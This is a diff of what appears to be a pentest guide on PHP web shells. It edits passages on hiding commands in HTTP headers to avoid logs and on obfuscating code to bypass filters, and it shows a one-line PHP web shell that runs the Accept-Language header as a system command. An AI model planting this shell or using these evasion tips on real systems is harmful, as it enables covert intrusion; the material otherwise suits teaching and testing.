@@ -49,7 +49,7 @@ http://192.168.1.103/index.php?cmd=pwd
 
 ### Make it stealthy
 
-We can make the commands from above a bit more stealthy. Instead of passing the cmds through the url, which will be obvious in logs, we cna pass them through other header-paramters. The use tampterdata or burpsuite to insert the commands. Or just netcat or curl.
+We can make the commands from above a bit more stealthy. Instead of passing the cmd through the url, which will be obvious in logs, we can pass them through other header-parameters. We can use a tool like Burp Suite or even just netcat or curl to insert these commands.
 
 ```php
 <?php system($_SERVER['HTTP_ACCEPT_LANGUAGE']); ?>
@@ -61,7 +61,7 @@ We can make the commands from above a bit more stealthy. Instead of passing the 
 
 ### Obfuscation
 
-The following functions can be used to obfuscate the code.
+The following functions can be used to obfuscate the code.  It's unlikely to fool a SOC analyst, but it's useful bypassing character filtering methods.
 
 ```
 eval()
